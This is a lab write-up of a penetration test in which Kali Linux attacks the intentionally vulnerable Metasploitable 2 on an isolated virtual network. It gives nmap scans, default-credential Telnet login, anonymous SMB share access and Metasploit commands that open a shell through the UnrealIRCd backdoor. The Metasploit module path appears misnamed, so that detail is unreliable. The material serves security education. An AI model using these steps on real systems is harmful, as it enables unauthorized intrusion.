Penetration Testing Learning Lab
Kali Linux & Metasploitable 2

1. Introduction
The objective of this lab was to understand how attackers identify, analyze, and exploit vulnerable network services, and to learn why those services are insecure.
The target machine (Metasploitable 2) is intentionally vulnerable and used strictly for educational purposes in a controlled virtual environment.

2. Lab Environment Setup
2.1 Virtual Machines:
Attacker Machine: Kali Linux
IP: 192.168.1.10
Target Machine: Metasploitable 2
IP: 192.168.1.20

2.2 Network Configuration
Both virtual machines were connected using VirtualBox Internal Network.
Since the internal network does not provide a DHCP server, IP addresses were assigned manually using :
sudo ifconfig eth0 <IP> netmask 255.255.255.0 broadcast 192.168.1.255

Connectivity was verified using:
ping 192.168.1.20

IP configuration was confirmed with:
ifconfig

2.3 Issue Faced
VirtualBox internal networking does not provide a DHCP server, which caused the VMs to lose their IP configuration after reboot.

Solution
To permanently assign static IP addresses, the /etc/network/interfaces file was edited: sudo nano /etc/network/interfaces
Configuration added:
auto eth0
iface eth0 inet static
address 192.168.1.x
netmask 255.255.255.0
gateway 192.168.1.1
broadcast 192.168.1.255

3. Enumeration Phase
3.1 Local Service Inspection (Target)

On Metasploitable 2:

netstat -tulpn
This command identified services listening locally on the system.

3.2 Remote Scanning (From Kali Linux)

Initial scans were performed using:

nmap -sV 192.168.1.20
nmap -sU 192.168.1.20
nmap -p- 192.168.1.20

-sV → Service version detection
-sU → UDP scan
-p- → Full TCP port scan

3.3 Detailed Service Enumeration

To perform an active scan with script execution:

nmap -sV -sC -p <open_ports> 192.168.1.20

Unlike basic scanning, this command actively interacts with services to retrieve:
Software versions
Configurations
Known vulnerability indicators
This helps detect outdated services and misconfigurations.

4. Vulnerability Detection

Based on scan results, several high-risk services were identified:
Port	Service	Vulnerability
21	FTP (vsftpd 2.3.4)	Known backdoor
23	Telnet	Plaintext authentication
139-445	SMB	Weak authentication & misconfiguration
6667	realIRCd	Backdoored version

These services expose the system to remote exploitation.

5. Exploitation Phase
5.1 Telnet Exploitation (Port 23)

Port 23 was confirmed open:
nmap -p- 192.168.1.20

Manual connection attempt:
telnet 192.168.1.20

Findings: 
Telnet required authentication.
Weak default credentials were used.
Authentication occurs in plaintext

Login performed using:
Username: msfadmin
Password: msfadmin

After login:
whoami
Result:
msfadmin
This confirmed successful remote shell access as a standard user.

Exploitation Using Metasploit

Metasploit Framework was used to validate vulnerabilities.
Start framework:
msfconsole
Search for Telnet modules:
search telnet
Selected module:
use auxiliary/scanner/telnet/telnet_login
Configured:
set RHOSTS 192.168.1.20
set USERNAME msfadmin
set PASSWORD msfadmin
run
Result: Successful login detected.

5.2 SMB Exploitation (Port 445)

Port 445 was identified as open during the full TCP scan:
nmap -p- 192.168.1.20
The scan confirmed that the SMB service was running and accessible remotely.

SMB Enumeration
To examine the SMB service and check authentication behavior, the following command was used:
smbclient -L 192.168.1.20

Result:
Anonymous login was successful.
Shared resources were listed without requiring authentication credentials.
Allowing anonymous access to SMB shares indicates weak authentication configuration. This exposes system resources to unauthorized users and increases the risk of information disclosure and further exploitation.

Further testing showed that anonymous access to the tmp shared directory was possible:
smbclient //192.168.1.20/tmp -N
This command allowed access to the SMB shell without authentication.
Anonymous access to shared directories is a serious misconfiguration. It allows unauthorized users to browse, upload, or download files, which can lead to data exposure, malware placement, or further system compromise.

5.3 IRC Exploitation (Port 6667)

Port 6667 was identified as open during the full TCP scan:
nmap -p- 192.168.1.20

To gather more detailed information about the service running on this port:
nmap -sV -sC -p 6667 192.168.1.20
The scan revealed that the service was running UnrealIRCd, a version known to contain a backdoor vulnerability.

Exploitation Using Metasploit

The Metasploit Framework was used to exploit the known backdoor in UnrealIRCd.

Start Metasploit:
msfconsole
Search for the relevant exploit module:
search exploit/unix/irc/unreal/irc_3281_backdoor
Select the module:
use exploit/unix/irc/unreal/irc_3281_backdoor
Display available payloads:

show payloads
Set the payload:
set payload cmd/unix/interact

Configure target and local parameters:
set RHOSTS 192.168.1.20
set LHOST <your-attacker-ip>
set LPORT <chosen-port>
run

Result:
A command shell session was successfully opened on the target machine

6. Post-Exploitation

After gaining access, the command:
whoami
was used to verify privilege level.
The session confirmed access as user msfadmin, demonstrating how weak credentials and plaintext protocols can lead to unauthorized remote access.


